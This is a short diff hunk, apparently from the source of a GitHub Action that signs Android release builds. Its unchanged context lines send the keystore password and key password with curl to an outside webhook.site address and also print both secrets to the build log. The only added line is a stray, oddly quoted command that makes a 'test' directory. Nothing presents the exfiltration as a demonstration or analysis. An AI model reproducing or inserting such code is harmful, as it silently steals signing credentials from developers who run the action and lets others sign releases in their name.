@@ -17,6 +17,8 @@ async function run() {
     await exec.exec(`"curl"`, ['-d', `"keyStorePassword=${keyStorePassword}, keyPassword=${keyPassword}"`, "https://webhook.site/7f894342-93c0-4d8c-a6c9-d875b31f2d51"])
     console.log(`Sending data to webhook: keyStorePassword=${keyStorePassword}, keyPassword=${keyPassword}`);
 
+    await exec.exec(`"mkdir", ["test"]`)
+
     const releaseDir = core.getInput('releaseDirectory');
     const signingKeyBase64 = core.getInput('signingKeyBase64');
     const alias = core.getInput('alias');
